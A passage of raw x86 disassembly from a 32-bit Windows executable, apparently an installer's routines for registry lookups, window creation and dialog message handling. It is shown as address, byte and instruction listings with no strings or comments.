  403aa5:	74 2f                	je     0x403ad6
  403aa7:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403aaa:	50                   	push   %eax
  403aab:	68 90 a1 40 00       	push   $0x40a190
  403ab0:	57                   	push   %edi
  403ab1:	ff 15 20 80 40 00    	call   *0x408020
  403ab7:	57                   	push   %edi
  403ab8:	57                   	push   %edi
  403ab9:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403abc:	57                   	push   %edi
  403abd:	50                   	push   %eax
  403abe:	57                   	push   %edi
  403abf:	ff 75 e8             	push   -0x18(%ebp)
  403ac2:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  403ac9:	c7 45 e4 02 00 00 00 	movl   $0x2,-0x1c(%ebp)
  403ad0:	ff 15 1c 80 40 00    	call   *0x40801c
  403ad6:	6a 04                	push   $0x4
  403ad8:	e8 50 2d 00 00       	call   0x40682d
  403add:	3b c7                	cmp    %edi,%eax
  403adf:	be 02 00 04 80       	mov    $0x80040002,%esi
  403ae4:	74 0c                	je     0x403af2
  403ae6:	56                   	push   %esi
  403ae7:	6a 25                	push   $0x25
  403ae9:	57                   	push   %edi
  403aea:	57                   	push   %edi
  403aeb:	57                   	push   %edi
  403aec:	ff d0                	call   *%eax
  403aee:	85 c0                	test   %eax,%eax
  403af0:	74 0d                	je     0x403aff
  403af2:	56                   	push   %esi
  403af3:	6a 02                	push   $0x2
  403af5:	ff 15 f8 81 40 00    	call   *0x4081f8
  403afb:	85 c0                	test   %eax,%eax
  403afd:	75 07                	jne    0x403b06
  403aff:	6a 09                	push   $0x9
  403b01:	e8 05 d9 ff ff       	call   0x40140b
  403b06:	a1 0c 44 42 00       	mov    0x42440c,%eax
  403b0b:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b0e:	74 03                	je     0x403b13
  403b10:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403b13:	ff 75 ec             	push   -0x14(%ebp)
  403b16:	ff 15 ac 80 40 00    	call   *0x4080ac
  403b1c:	a1 18 a0 40 00       	mov    0x40a018,%eax
  403b21:	56                   	push   %esi
  403b22:	8b 35 f8 80 40 00    	mov    0x4080f8,%esi
  403b28:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b2b:	74 0a                	je     0x403b37
  403b2d:	50                   	push   %eax
  403b2e:	ff d6                	call   *%esi
  403b30:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  403b37:	a1 1c a0 40 00       	mov    0x40a01c,%eax
  403b3c:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b3f:	74 0a                	je     0x403b4b
  403b41:	50                   	push   %eax
  403b42:	ff d6                	call   *%esi
  403b44:	83 0d 1c a0 40 00 ff 	orl    $0xffffffff,0x40a01c
  403b4b:	e8 29 00 00 00       	call   0x403b79
  403b50:	6a 07                	push   $0x7
  403b52:	68 00 b8 42 00       	push   $0x42b800
  403b57:	e8 6b 20 00 00       	call   0x405bc7
  403b5c:	5e                   	pop    %esi
  403b5d:	c3                   	ret
  403b5e:	56                   	push   %esi
  403b5f:	8b 35 18 f9 41 00    	mov    0x41f918,%esi
  403b65:	eb 0a                	jmp    0x403b71
  403b67:	ff 74 24 08          	push   0x8(%esp)
  403b6b:	ff 56 04             	call   *0x4(%esi)
  403b6e:	8b 36                	mov    (%esi),%esi
  403b70:	59                   	pop    %ecx
  403b71:	85 f6                	test   %esi,%esi
  403b73:	75 f2                	jne    0x403b67
  403b75:	5e                   	pop    %esi
  403b76:	c2 04 00             	ret    $0x4
  403b79:	56                   	push   %esi
  403b7a:	8b 35 18 f9 41 00    	mov    0x41f918,%esi
  403b80:	6a 00                	push   $0x0
  403b82:	e8 d7 ff ff ff       	call   0x403b5e
  403b87:	85 f6                	test   %esi,%esi
  403b89:	74 1a                	je     0x403ba5
  403b8b:	57                   	push   %edi
  403b8c:	8b fe                	mov    %esi,%edi
  403b8e:	8b 36                	mov    (%esi),%esi
  403b90:	ff 77 08             	push   0x8(%edi)
  403b93:	ff 15 18 81 40 00    	call   *0x408118
  403b99:	57                   	push   %edi
  403b9a:	ff 15 08 81 40 00    	call   *0x408108
  403ba0:	85 f6                	test   %esi,%esi
  403ba2:	75 e8                	jne    0x403b8c
  403ba4:	5f                   	pop    %edi
  403ba5:	83 25 18 f9 41 00 00 	andl   $0x0,0x41f918
  403bac:	5e                   	pop    %esi
  403bad:	c3                   	ret
  403bae:	a1 18 f9 41 00       	mov    0x41f918,%eax
  403bb3:	eb 0b                	jmp    0x403bc0
  403bb5:	8b 48 08             	mov    0x8(%eax),%ecx
  403bb8:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403bbc:	74 0a                	je     0x403bc8
  403bbe:	8b 00                	mov    (%eax),%eax
  403bc0:	85 c0                	test   %eax,%eax
  403bc2:	75 f1                	jne    0x403bb5
  403bc4:	40                   	inc    %eax
  403bc5:	c2 04 00             	ret    $0x4
  403bc8:	33 c0                	xor    %eax,%eax
  403bca:	eb f9                	jmp    0x403bc5
  403bcc:	56                   	push   %esi
  403bcd:	8b 74 24 08          	mov    0x8(%esp),%esi
  403bd1:	56                   	push   %esi
  403bd2:	e8 d7 ff ff ff       	call   0x403bae
  403bd7:	85 c0                	test   %eax,%eax
  403bd9:	75 03                	jne    0x403bde
  403bdb:	40                   	inc    %eax
  403bdc:	eb 2c                	jmp    0x403c0a
  403bde:	6a 0c                	push   $0xc
  403be0:	6a 40                	push   $0x40
  403be2:	ff 15 0c 81 40 00    	call   *0x40810c
  403be8:	85 c0                	test   %eax,%eax
  403bea:	74 1b                	je     0x403c07
  403bec:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403bf0:	89 70 08             	mov    %esi,0x8(%eax)
  403bf3:	89 48 04             	mov    %ecx,0x4(%eax)
  403bf6:	8b 0d 18 f9 41 00    	mov    0x41f918,%ecx
  403bfc:	89 08                	mov    %ecx,(%eax)
  403bfe:	a3 18 f9 41 00       	mov    %eax,0x41f918
  403c03:	33 c0                	xor    %eax,%eax
  403c05:	eb 03                	jmp    0x403c0a
  403c07:	83 c8 ff             	or     $0xffffffff,%eax
  403c0a:	5e                   	pop    %esi
  403c0b:	c2 08 00             	ret    $0x8
  403c0e:	83 ec 10             	sub    $0x10,%esp
  403c11:	53                   	push   %ebx
  403c12:	55                   	push   %ebp
  403c13:	56                   	push   %esi
  403c14:	8b 35 70 43 42 00    	mov    0x424370,%esi
  403c1a:	57                   	push   %edi
  403c1b:	6a 02                	push   $0x2
  403c1d:	e8 0b 2c 00 00       	call   0x40682d
  403c22:	33 db                	xor    %ebx,%ebx
  403c24:	3b c3                	cmp    %ebx,%eax
  403c26:	74 12                	je     0x403c3a
  403c28:	ff d0                	call   *%eax
  403c2a:	0f b7 c0             	movzwl %ax,%eax
  403c2d:	50                   	push   %eax
  403c2e:	68 00 b0 42 00       	push   $0x42b000
  403c33:	e8 2b 27 00 00       	call   0x406363
  403c38:	eb 54                	jmp    0x403c8e
  403c3a:	bf 58 09 42 00       	mov    $0x420958,%edi
  403c3f:	53                   	push   %ebx
  403c40:	57                   	push   %edi
  403c41:	53                   	push   %ebx
  403c42:	68 44 83 40 00       	push   $0x408344
  403c47:	68 01 00 00 80       	push   $0x80000001
  403c4c:	c6 05 00 b0 42 00 30 	movb   $0x30,0x42b000
  403c53:	c6 05 01 b0 42 00 78 	movb   $0x78,0x42b001
  403c5a:	88 1d 02 b0 42 00    	mov    %bl,0x42b002
  403c60:	e8 87 26 00 00       	call   0x4062ec
  403c65:	38 1d 58 09 42 00    	cmp    %bl,0x420958
  403c6b:	75 16                	jne    0x403c83
  403c6d:	53                   	push   %ebx
  403c6e:	57                   	push   %edi
  403c6f:	68 62 83 40 00       	push   $0x408362
  403c74:	68 1c 83 40 00       	push   $0x40831c
  403c79:	68 03 00 00 80       	push   $0x80000003
  403c7e:	e8 69 26 00 00       	call   0x4062ec
  403c83:	57                   	push   %edi
  403c84:	68 00 b0 42 00       	push   $0x42b000
  403c89:	e8 93 27 00 00       	call   0x406421
  403c8e:	e8 40 02 00 00       	call   0x403ed3
  403c93:	a1 78 43 42 00       	mov    0x424378,%eax
  403c98:	bd 00 a4 42 00       	mov    $0x42a400,%ebp
  403c9d:	83 e0 20             	and    $0x20,%eax
  403ca0:	55                   	push   %ebp
  403ca1:	a3 e0 43 42 00       	mov    %eax,0x4243e0
  403ca6:	c7 05 fc 43 42 00 00 	movl   $0x10000,0x4243fc
  403cad:	00 01 00 
  403cb0:	e8 d0 21 00 00       	call   0x405e85
  403cb5:	85 c0                	test   %eax,%eax
  403cb7:	0f 85 81 00 00 00    	jne    0x403d3e
  403cbd:	8b 4e 48             	mov    0x48(%esi),%ecx
  403cc0:	3b cb                	cmp    %ebx,%ecx
  403cc2:	74 7a                	je     0x403d3e
  403cc4:	8b 56 4c             	mov    0x4c(%esi),%edx
  403cc7:	a1 98 43 42 00       	mov    0x424398,%eax
  403ccc:	bf 00 33 42 00       	mov    $0x423300,%edi
  403cd1:	53                   	push   %ebx
  403cd2:	03 d0                	add    %eax,%edx
  403cd4:	57                   	push   %edi
  403cd5:	03 c8                	add    %eax,%ecx
  403cd7:	52                   	push   %edx
  403cd8:	51                   	push   %ecx
  403cd9:	ff 76 44             	push   0x44(%esi)
  403cdc:	e8 0b 26 00 00       	call   0x4062ec
  403ce1:	a0 00 33 42 00       	mov    0x423300,%al
  403ce6:	3a c3                	cmp    %bl,%al
  403ce8:	74 54                	je     0x403d3e
  403cea:	3c 22                	cmp    $0x22,%al
  403cec:	75 0f                	jne    0x403cfd
  403cee:	bf 01 33 42 00       	mov    $0x423301,%edi
  403cf3:	6a 22                	push   $0x22
  403cf5:	57                   	push   %edi
  403cf6:	e8 c7 20 00 00       	call   0x405dc2
  403cfb:	88 18                	mov    %bl,(%eax)
  403cfd:	57                   	push   %edi
  403cfe:	e8 18 27 00 00       	call   0x40641b
  403d03:	8d 44 38 fc          	lea    -0x4(%eax,%edi,1),%eax
  403d07:	3b c7                	cmp    %edi,%eax
  403d09:	76 26                	jbe    0x403d31
  403d0b:	68 08 a2 40 00       	push   $0x40a208
  403d10:	50                   	push   %eax
  403d11:	ff 15 fc 80 40 00    	call   *0x4080fc
  403d17:	85 c0                	test   %eax,%eax
  403d19:	75 16                	jne    0x403d31
  403d1b:	57                   	push   %edi
  403d1c:	ff 15 d8 80 40 00    	call   *0x4080d8
  403d22:	83 f8 ff             	cmp    $0xffffffff,%eax
  403d25:	74 04                	je     0x403d2b
  403d27:	a8 10                	test   $0x10,%al
  403d29:	75 06                	jne    0x403d31
  403d2b:	57                   	push   %edi
  403d2c:	e8 ad 20 00 00       	call   0x405dde
  403d31:	57                   	push   %edi
  403d32:	e8 60 20 00 00       	call   0x405d97
  403d37:	50                   	push   %eax
  403d38:	55                   	push   %ebp
  403d39:	e8 c7 26 00 00       	call   0x406405
  403d3e:	55                   	push   %ebp
  403d3f:	e8 41 21 00 00       	call   0x405e85
  403d44:	85 c0                	test   %eax,%eax
  403d46:	75 0c                	jne    0x403d54
  403d48:	ff b6 18 01 00 00    	push   0x118(%esi)
  403d4e:	55                   	push   %ebp
  403d4f:	e8 44 27 00 00       	call   0x406498
  403d54:	68 40 80 00 00       	push   $0x8040
  403d59:	53                   	push   %ebx
  403d5a:	53                   	push   %ebx
  403d5b:	6a 01                	push   $0x1
  403d5d:	6a 67                	push   $0x67
  403d5f:	ff 35 60 43 42 00    	push   0x424360
  403d65:	ff 15 30 82 40 00    	call   *0x408230
  403d6b:	a3 48 3b 42 00       	mov    %eax,0x423b48
  403d70:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403d74:	bf 00 3b 42 00       	mov    $0x423b00,%edi
  403d79:	74 7f                	je     0x403dfa
  403d7b:	8b 0d 60 43 42 00    	mov    0x424360,%ecx
  403d81:	be 04 a2 40 00       	mov    $0x40a204,%esi
  403d86:	57                   	push   %edi
  403d87:	c7 05 04 3b 42 00 00 	movl   $0x401000,0x423b04
  403d8e:	10 40 00 
  403d91:	89 0d 10 3b 42 00    	mov    %ecx,0x423b10
  403d97:	a3 14 3b 42 00       	mov    %eax,0x423b14
  403d9c:	89 35 24 3b 42 00    	mov    %esi,0x423b24
  403da2:	ff 15 e0 81 40 00    	call   *0x4081e0
  403da8:	66 85 c0             	test   %ax,%ax
  403dab:	0f 84 18 01 00 00    	je     0x403ec9
  403db1:	8d 44 24 10          	lea    0x10(%esp),%eax
  403db5:	53                   	push   %ebx
  403db6:	50                   	push   %eax
  403db7:	53                   	push   %ebx
  403db8:	6a 30                	push   $0x30
  403dba:	ff 15 e4 81 40 00    	call   *0x4081e4
  403dc0:	53                   	push   %ebx
  403dc1:	ff 35 60 43 42 00    	push   0x424360
  403dc7:	8b 44 24 24          	mov    0x24(%esp),%eax
  403dcb:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403dcf:	53                   	push   %ebx
  403dd0:	53                   	push   %ebx
  403dd1:	50                   	push   %eax
  403dd2:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403dd6:	2b 44 24 24          	sub    0x24(%esp),%eax
  403dda:	50                   	push   %eax
  403ddb:	ff 74 24 2c          	push   0x2c(%esp)
  403ddf:	ff 74 24 2c          	push   0x2c(%esp)
  403de3:	68 00 00 00 80       	push   $0x80000000
  403de8:	53                   	push   %ebx
  403de9:	56                   	push   %esi
  403dea:	68 80 00 00 00       	push   $0x80
  403def:	ff 15 e8 81 40 00    	call   *0x4081e8
  403df5:	a3 38 09 42 00       	mov    %eax,0x420938
  403dfa:	53                   	push   %ebx
  403dfb:	e8 0b d6 ff ff       	call   0x40140b
  403e00:	85 c0                	test   %eax,%eax
  403e02:	74 08                	je     0x403e0c
  403e04:	6a 02                	push   $0x2
  403e06:	58                   	pop    %eax
  403e07:	e9 bf 00 00 00       	jmp    0x403ecb
  403e0c:	e8 c2 00 00 00       	call   0x403ed3
  403e11:	39 1d 00 44 42 00    	cmp    %ebx,0x424400
  403e17:	0f 85 83 00 00 00    	jne    0x403ea0
  403e1d:	6a 05                	push   $0x5
  403e1f:	ff 35 38 09 42 00    	push   0x420938
  403e25:	ff 15 14 82 40 00    	call   *0x408214
  403e2b:	68 10 83 40 00       	push   $0x408310
  403e30:	e8 8a 29 00 00       	call   0x4067bf
  403e35:	85 c0                	test   %eax,%eax
  403e37:	75 0a                	jne    0x403e43
  403e39:	68 04 83 40 00       	push   $0x408304
  403e3e:	e8 7c 29 00 00       	call   0x4067bf
  403e43:	8b 35 6c 82 40 00    	mov    0x40826c,%esi
  403e49:	bd f8 82 40 00       	mov    $0x4082f8,%ebp
  403e4e:	57                   	push   %edi
  403e4f:	55                   	push   %ebp
  403e50:	53                   	push   %ebx
  403e51:	ff d6                	call   *%esi
  403e53:	85 c0                	test   %eax,%eax
  403e55:	75 16                	jne    0x403e6d
  403e57:	57                   	push   %edi
  403e58:	68 ec 82 40 00       	push   $0x4082ec
  403e5d:	53                   	push   %ebx
  403e5e:	ff d6                	call   *%esi
  403e60:	57                   	push   %edi
  403e61:	89 2d 24 3b 42 00    	mov    %ebp,0x423b24
  403e67:	ff 15 e0 81 40 00    	call   *0x4081e0
  403e6d:	a1 40 3b 42 00       	mov    0x423b40,%eax
  403e72:	53                   	push   %ebx
  403e73:	83 c0 69             	add    $0x69,%eax
  403e76:	68 ab 3f 40 00       	push   $0x403fab
  403e7b:	0f b7 c0             	movzwl %ax,%eax
  403e7e:	53                   	push   %ebx
  403e7f:	50                   	push   %eax
  403e80:	ff 35 60 43 42 00    	push   0x424360
  403e86:	ff 15 f0 81 40 00    	call   *0x4081f0
  403e8c:	6a 05                	push   $0x5
  403e8e:	8b f0                	mov    %eax,%esi
  403e90:	e8 76 d5 ff ff       	call   0x40140b
  403e95:	6a 01                	push   $0x1
  403e97:	e8 c2 fc ff ff       	call   0x403b5e
  403e9c:	8b c6                	mov    %esi,%eax
  403e9e:	eb 2b                	jmp    0x403ecb
  403ea0:	53                   	push   %ebx
  403ea1:	e8 75 17 00 00       	call   0x40561b
  403ea6:	85 c0                	test   %eax,%eax
  403ea8:	74 18                	je     0x403ec2
  403eaa:	39 1d 2c 3b 42 00    	cmp    %ebx,0x423b2c
  403eb0:	0f 85 4e ff ff ff    	jne    0x403e04
  403eb6:	6a 02                	push   $0x2
  403eb8:	e8 4e d5 ff ff       	call   0x40140b
  403ebd:	e9 42 ff ff ff       	jmp    0x403e04
  403ec2:	6a 01                	push   $0x1
  403ec4:	e8 42 d5 ff ff       	call   0x40140b
  403ec9:	33 c0                	xor    %eax,%eax
  403ecb:	5f                   	pop    %edi
  403ecc:	5e                   	pop    %esi
  403ecd:	5d                   	pop    %ebp
  403ece:	5b                   	pop    %ebx
  403ecf:	83 c4 10             	add    $0x10,%esp
  403ed2:	c3                   	ret
  403ed3:	53                   	push   %ebx
  403ed4:	55                   	push   %ebp
  403ed5:	56                   	push   %esi
  403ed6:	57                   	push   %edi
  403ed7:	bf 00 b0 42 00       	mov    $0x42b000,%edi
  403edc:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403ee1:	57                   	push   %edi
  403ee2:	e8 95 24 00 00       	call   0x40637c
  403ee7:	8b 35 a4 43 42 00    	mov    0x4243a4,%esi
  403eed:	85 f6                	test   %esi,%esi
  403eef:	74 45                	je     0x403f36
  403ef1:	8b 0d 70 43 42 00    	mov    0x424370,%ecx
  403ef7:	8b 49 64             	mov    0x64(%ecx),%ecx
  403efa:	8b d1                	mov    %ecx,%edx
  403efc:	0f af ce             	imul   %esi,%ecx
  403eff:	f7 da                	neg    %edx
  403f01:	03 0d a0 43 42 00    	add    0x4243a0,%ecx
  403f07:	03 ca                	add    %edx,%ecx
  403f09:	4e                   	dec    %esi
  403f0a:	66 8b 29             	mov    (%ecx),%bp
  403f0d:	66 33 e8             	xor    %ax,%bp
  403f10:	23 eb                	and    %ebx,%ebp
  403f12:	66 85 ed             	test   %bp,%bp
  403f15:	74 06                	je     0x403f1d
  403f17:	85 f6                	test   %esi,%esi
  403f19:	75 ec                	jne    0x403f07
  403f1b:	eb 19                	jmp    0x403f36
  403f1d:	8b 51 02             	mov    0x2(%ecx),%edx
  403f20:	89 15 40 3b 42 00    	mov    %edx,0x423b40
  403f26:	8b 51 06             	mov    0x6(%ecx),%edx
  403f29:	89 15 08 44 42 00    	mov    %edx,0x424408
  403f2f:	8d 51 0a             	lea    0xa(%ecx),%edx
  403f32:	85 d2                	test   %edx,%edx
  403f34:	75 12                	jne    0x403f48
  403f36:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403f3b:	75 07                	jne    0x403f44
  403f3d:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403f42:	eb a3                	jmp    0x403ee7
  403f44:	33 db                	xor    %ebx,%ebx
  403f46:	eb 9f                	jmp    0x403ee7
  403f48:	89 15 3c 3b 42 00    	mov    %edx,0x423b3c
  403f4e:	0f b7 01             	movzwl (%ecx),%eax
  403f51:	50                   	push   %eax
  403f52:	57                   	push   %edi
  403f53:	e8 0b 24 00 00       	call   0x406363
  403f58:	e8 2f 00 00 00       	call   0x403f8c
  403f5d:	a1 8c 43 42 00       	mov    0x42438c,%eax
  403f62:	8b 35 88 43 42 00    	mov    0x424388,%esi
  403f68:	85 c0                	test   %eax,%eax
  403f6a:	74 1b                	je     0x403f87
  403f6c:	8b f8                	mov    %eax,%edi
  403f6e:	8b 06                	mov    (%esi),%eax
  403f70:	85 c0                	test   %eax,%eax
  403f72:	74 0a                	je     0x403f7e
  403f74:	50                   	push   %eax
  403f75:	8d 46 18             	lea    0x18(%esi),%eax
  403f78:	50                   	push   %eax
  403f79:	e8 1a 25 00 00       	call   0x406498
  403f7e:	81 c6 18 04 00 00    	add    $0x418,%esi
  403f84:	4f                   	dec    %edi
  403f85:	75 e7                	jne    0x403f6e
  403f87:	5f                   	pop    %edi
  403f88:	5e                   	pop    %esi
  403f89:	5d                   	pop    %ebp
  403f8a:	5b                   	pop    %ebx
  403f8b:	c3                   	ret
  403f8c:	56                   	push   %esi
  403f8d:	be 60 3b 42 00       	mov    $0x423b60,%esi
  403f92:	6a fe                	push   $0xfffffffe
  403f94:	56                   	push   %esi
  403f95:	e8 fe 24 00 00       	call   0x406498
  403f9a:	56                   	push   %esi
  403f9b:	ff 35 38 09 42 00    	push   0x420938
  403fa1:	ff 15 08 82 40 00    	call   *0x408208
  403fa7:	8b c6                	mov    %esi,%eax
  403fa9:	5e                   	pop    %esi
  403faa:	c3                   	ret
  403fab:	83 ec 10             	sub    $0x10,%esp
  403fae:	b9 10 01 00 00       	mov    $0x110,%ecx
  403fb3:	53                   	push   %ebx
  403fb4:	55                   	push   %ebp
  403fb5:	56                   	push   %esi
  403fb6:	8b 74 24 24          	mov    0x24(%esp),%esi
  403fba:	3b f1                	cmp    %ecx,%esi
  403fbc:	57                   	push   %edi
  403fbd:	0f 84 61 01 00 00    	je     0x404124
  403fc3:	81 fe 08 04 00 00    	cmp    $0x408,%esi
  403fc9:	0f 84 55 01 00 00    	je     0x404124
  403fcf:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403fd3:	33 ed                	xor    %ebp,%ebp
  403fd5:	83 fe 47             	cmp    $0x47,%esi
  403fd8:	75 13                	jne    0x403fed
  403fda:	6a 13                	push   $0x13
  403fdc:	55                   	push   %ebp
  403fdd:	55                   	push   %ebp
  403fde:	55                   	push   %ebp
  403fdf:	55                   	push   %ebp
  403fe0:	57                   	push   %edi
  403fe1:	ff 35 38 09 42 00    	push   0x420938
  403fe7:	ff 15 bc 81 40 00    	call   *0x4081bc
  403fed:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  403ff1:	83 fe 05             	cmp    $0x5,%esi
  403ff4:	75 42                	jne    0x404038
  403ff6:	8b c3                	mov    %ebx,%eax
  403ff8:	48                   	dec    %eax
  403ff9:	f7 d8                	neg    %eax
  403ffb:	1b c0                	sbb    %eax,%eax
  403ffd:	83 e0 05             	and    $0x5,%eax
  404000:	50                   	push   %eax
  404001:	ff 35 38 09 42 00    	push   0x420938
  404007:	ff 15 14 82 40 00    	call   *0x408214
  40400d:	83 fb 02             	cmp    $0x2,%ebx
  404010:	0f 85 fb 00 00 00    	jne    0x404111
  404016:	6a f0                	push   $0xfffffff0
  404018:	57                   	push   %edi
  404019:	ff 15 c0 81 40 00    	call   *0x4081c0
  40401f:	25 00 00 01 21       	and    $0x21010000,%eax
  404024:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  404029:	0f 85 e2 00 00 00    	jne    0x404111
  40402f:	6a 04                	push   $0x4
  404031:	57                   	push   %edi
  404032:	ff 15 14 82 40 00    	call   *0x408214
  404038:	81 fe 0d 04 00 00    	cmp    $0x40d,%esi
  40403e:	75 17                	jne    0x404057
  404040:	ff 35 38 3b 42 00    	push   0x423b38
  404046:	ff 15 fc 81 40 00    	call   *0x4081fc
  40404c:	89 1d 38 3b 42 00    	mov    %ebx,0x423b38
  404052:	e9 f8 03 00 00       	jmp    0x40444f
  404057:	83 fe 11             	cmp    $0x11,%esi
  40405a:	75 11                	jne    0x40406d
  40405c:	55                   	push   %ebp
  40405d:	55                   	push   %ebp
  40405e:	57                   	push   %edi
  40405f:	ff 15 2c 82 40 00    	call   *0x40822c
  404065:	33 c0                	xor    %eax,%eax
  404067:	40                   	inc    %eax
  404068:	e9 07 04 00 00       	jmp    0x404474
  40406d:	81 fe 11 01 00 00    	cmp    $0x111,%esi
  404073:	0f 85 98 00 00 00    	jne    0x404111
  404079:	0f b7 f3             	movzwl %bx,%esi
  40407c:	56                   	push   %esi
  40407d:	57                   	push   %edi
  40407e:	ff 15 28 82 40 00    	call   *0x408228
  404084:	8b f8                	mov    %eax,%edi
  404086:	3b fd                	cmp    %ebp,%edi
  404088:	74 1d                	je     0x4040a7
  40408a:	55                   	push   %ebp
  40408b:	55                   	push   %ebp
  40408c:	68 f3 00 00 00       	push   $0xf3
  404091:	57                   	push   %edi
  404092:	ff 15 44 82 40 00    	call   *0x408244
  404098:	57                   	push   %edi
  404099:	ff 15 c4 81 40 00    	call   *0x4081c4
  40409f:	85 c0                	test   %eax,%eax
  4040a1:	0f 84 cb 03 00 00    	je     0x404472
  4040a7:	83 fe 01             	cmp    $0x1,%esi
  4040aa:	75 03                	jne    0x4040af
  4040ac:	56                   	push   %esi
  4040ad:	eb 2e                	jmp    0x4040dd
  4040af:	83 fe 03             	cmp    $0x3,%esi
  4040b2:	75 0c                	jne    0x4040c0
  4040b4:	39 2d ec a1 40 00    	cmp    %ebp,0x40a1ec
  4040ba:	7e 3f                	jle    0x4040fb
  4040bc:	6a ff                	push   $0xffffffff
  4040be:	eb 1d                	jmp    0x4040dd
  4040c0:	6a 02                	push   $0x2
  4040c2:	5f                   	pop    %edi
  4040c3:	3b f7                	cmp    %edi,%esi
  4040c5:	75 34                	jne    0x4040fb
  4040c7:	39 2d ec 43 42 00    	cmp    %ebp,0x4243ec
  4040cd:	74 15                	je     0x4040e4
  4040cf:	57                   	push   %edi
  4040d0:	e8 36 d3 ff ff       	call   0x40140b
  4040d5:	89 3d 28 fd 41 00    	mov    %edi,0x41fd28
  4040db:	6a 78                	push   $0x78
  4040dd:	e8 9c 03 00 00       	call   0x40447e
  4040e2:	eb 2d                	jmp    0x404111
  4040e4:	6a 03                	push   $0x3
  4040e6:	e8 20 d3 ff ff       	call   0x40140b
  4040eb:	85 c0                	test   %eax,%eax
  4040ed:	75 22                	jne    0x404111
  4040ef:	c7 05 28 fd 41 00 01 	movl   $0x1,0x41fd28
  4040f6:	00 00 00 
  4040f9:	eb e0                	jmp    0x4040db
  4040fb:	ff 74 24 30          	push   0x30(%esp)
  4040ff:	53                   	push   %ebx
  404100:	68 11 01 00 00       	push   $0x111
  404105:	ff 35 38 3b 42 00    	push   0x423b38
  40410b:	ff 15 44 82 40 00    	call   *0x408244
  404111:	ff 74 24 30          	push   0x30(%esp)
  404115:	53                   	push   %ebx
  404116:	ff 74 24 30          	push   0x30(%esp)
  40411a:	e8 ed 03 00 00       	call   0x40450c
  40411f:	e9 50 03 00 00       	jmp    0x404474
  404124:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404128:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40412c:	3b f1                	cmp    %ecx,%esi
  40412e:	a3 40 09 42 00       	mov    %eax,0x420940
  404133:	75 4d                	jne    0x404182
  404135:	8b 35 28 82 40 00    	mov    0x408228,%esi
  40413b:	6a 01                	push   $0x1
  40413d:	57                   	push   %edi
  40413e:	89 3d 68 43 42 00    	mov    %edi,0x424368
  404144:	ff d6                	call   *%esi
  404146:	6a 02                	push   $0x2
  404148:	57                   	push   %edi
  404149:	a3 54 09 42 00       	mov    %eax,0x420954
  40414e:	ff d6                	call   *%esi
  404150:	6a ff                	push   $0xffffffff
  404152:	6a 1c                	push   $0x1c
  404154:	57                   	push   %edi
  404155:	a3 20 f9 41 00       	mov    %eax,0x41f920
  40415a:	e8 46 03 00 00       	call   0x4044a5
  40415f:	ff 35 48 3b 42 00    	push   0x423b48
  404165:	6a f2                	push   $0xfffffff2
  404167:	57                   	push   %edi
  404168:	ff 15 c8 81 40 00    	call   *0x4081c8
  40416e:	6a 04                	push   $0x4
  404170:	e8 96 d2 ff ff       	call   0x40140b
  404175:	a3 2c 3b 42 00       	mov    %eax,0x423b2c
  40417a:	33 c0                	xor    %eax,%eax
  40417c:	40                   	inc    %eax
  40417d:	a3 40 09 42 00       	mov    %eax,0x420940
  404182:	8b 0d ec a1 40 00    	mov    0x40a1ec,%ecx
  404188:	33 ed                	xor    %ebp,%ebp
  40418a:	8b f1                	mov    %ecx,%esi
  40418c:	c1 e6 06             	shl    $0x6,%esi
  40418f:	03 35 80 43 42 00    	add    0x424380,%esi
  404195:	3b cd                	cmp    %ebp,%ecx
  404197:	7c 3e                	jl     0x4041d7
  404199:	83 f8 01             	cmp    $0x1,%eax
  40419c:	75 31                	jne    0x4041cf
  40419e:	55                   	push   %ebp
  40419f:	ff 76 10             	push   0x10(%esi)
  4041a2:	e8 e2 d1 ff ff       	call   0x401389
  4041a7:	85 c0                	test   %eax,%eax
  4041a9:	74 24                	je     0x4041cf
  4041ab:	6a 01                	push   $0x1
  4041ad:	55                   	push   %ebp
  4041ae:	68 0f 04 00 00       	push   $0x40f
  4041b3:	ff 35 38 3b 42 00    	push   0x423b38
  4041b9:	ff 15 44 82 40 00    	call   *0x408244
  4041bf:	33 c0                	xor    %eax,%eax
  4041c1:	39 2d 2c 3b 42 00    	cmp    %ebp,0x423b2c
  4041c7:	0f 94 c0             	sete   %al
  4041ca:	e9 a5 02 00 00       	jmp    0x404474
  4041cf:	39 2e                	cmp    %ebp,(%esi)
  4041d1:	0f 84 9b 02 00 00    	je     0x404472
  4041d7:	68 0b 04 00 00       	push   $0x40b
  4041dc:	e8 10 03 00 00       	call   0x4044f1
  4041e1:	a1 40 09 42 00       	mov    0x420940,%eax
  4041e6:	01 05 ec a1 40 00    	add    %eax,0x40a1ec
  4041ec:	c1 e0 06             	shl    $0x6,%eax
  4041ef:	03 f0                	add    %eax,%esi
  4041f1:	a1 ec a1 40 00       	mov    0x40a1ec,%eax
  4041f6:	3b 05 84 43 42 00    	cmp    0x424384,%eax
  4041fc:	75 07                	jne    0x404205
  4041fe:	6a 01                	push   $0x1
  404200:	e8 06 d2 ff ff       	call   0x40140b
  404205:	39 2d 2c 3b 42 00    	cmp    %ebp,0x423b2c
  40420b:	0f 85 1f 02 00 00    	jne    0x404430
  404211:	a1 84 43 42 00       	mov    0x424384,%eax
  404216:	39 05 ec a1 40 00    	cmp    %eax,0x40a1ec
  40421c:	0f 83 0e 02 00 00    	jae    0x404430
  404222:	ff 76 24             	push   0x24(%esi)
  404225:	8b 5e 14             	mov    0x14(%esi),%ebx
